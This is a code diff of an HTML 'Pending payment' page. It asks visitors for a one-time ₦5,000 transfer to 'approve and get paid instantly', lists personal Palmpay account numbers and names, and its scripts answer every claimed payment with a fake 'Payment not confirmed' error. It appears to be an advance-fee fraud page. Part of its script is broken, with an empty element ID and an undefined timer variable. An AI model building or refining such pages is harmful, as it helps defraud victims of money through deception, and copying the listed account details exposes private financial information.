@@ -9,25 +9,26 @@
    </head>
 <body>
   <div class="wrapper">
-    <h2 style="color: orange">Pending payment</h2>
-    <br>
+    <h2 style="color: orange; margin-top: -5%;">Pending payment</h2>
     <form action="#">
       <div class="bg">
-        <b>Kindly make a one time payment to approve and get paid instantly</b> 
+        <b>Kindly make a one time payment of <b style="font-size: 12px; color: limegreen;">₦5,000</b> to approve and get paid instantly</b> 
       </div>
-      <br>
       <div class="box">
-        <h4>AMOUNT ₦5,000</h4>
-        <hr>
-        <h5>Account Number | 8109263500</h5>
-        <hr>
-        <h5>Account Name | Mary Adeagbo</h5>
-        <hr>
-        <h5>Bank Name | Opay</h5>
+        <h2 style="font-size: 14px; font-weight: 700;">Account Number | 8160705552</h2>
+        <h2 style="font-size: 14px; font-weight: 700;" >Account Name | Jerry Ken</h2>
+        <h2 style="font-size: 15px; font-weight: 700;">Bank Name | Palmpay</h2>
       </div>
-      <br>
+      
+       <div class="box">
+        <h2 style="font-size: 14px; font-weight: 700;">Account Number | 8120402689</h2>
+        <h2 style="font-size: 14px; font-weight: 700;">Account Name | Honor Fixed</h2>
+        <h2 style="font-size: 14px; font-weight: 700;" >Bank Name | Palmpay </h2>
+      </div>
+      
       <div class="policy">
         <input type="checkbox" id="agree-checkbox">
+        <br>
         <h3>I have made this payment</h3>
       </div>
       <br>
@@ -42,12 +43,38 @@
   </div>
 </body>
    <script>
+    document.getElementById("").addEventListener("click", function () {
+      // Show the SweetAlert error with a countdown loader
+      Swal.fire({
+        icon: 'error',
+        title: 'Error!',
+        text: 'Payment not confirmed!',
+        timer: 5000, // Set the timer to 5 seconds (5000 ms)
+        timerProgressBar: true,
+        allowOutsideClick: false, // Prevent users from closing the popup by clicking outside
+        onBeforeOpen: () => {
+          Swal.showLoading(); // Show the loader before the popup opens
+        },
+        onClose: () => {
+          // Clear the timer when the popup is closed (e.g., when the timer is not yet finished)
+          clearInterval(timerInterval);
+        }
+      }).then((result) => {
+        // The popup is automatically closed after the timer ends,
+        // but you can handle the result here if needed.
+        // For example, you can perform an action after the popup closes.
+        if (result.dismiss === Swal.DismissReason.timer) {
+          console.log('Popup closed by timer');
+        }
+      });
+    });
+    
     function errorButton() {
       // Show the SweetAlert input dialog
       Swal.fire({
-        title: 'Your Account Number',
+        title: 'Transaction...',
         input: 'text',
-        inputPlaceholder: '12****7890',
+        inputPlaceholder: 'Account number',
         showCancelButton: true,
         confirmButtonText: 'Comfirm',
         showLoaderOnConfirm: true,
@@ -58,7 +85,7 @@
             // Simulate the search process with a setTimeout
             setTimeout(() => {
               // Replace this with your actual search logic
-             const results = ['Dear Customer ? You have not Make any payment Yet , Kindly Make a payment and We will Credit You immediately'];
+             const results = ['Sorry we can not comfirm your payment kindly check your Transaction details'];
               resolve(results);
             }, 10000); // Simulating a 2-second search process
           });
@@ -76,9 +103,9 @@
         }
       });
     } 
-  </script>
+</script>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.js" integrity="sha512-AA1Bzp5Q0K1KanKKmvN/4d3IRKVlv9PYgwFPvm32nPO6QS8yH1HO7LbgB1pgiOxPtfeg5zEn2ba64MUcqJx6CA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 <script src="https://cdn.jsdelivr.net/npm/sweetalert2@9"></script>
-  </html>
+</html>
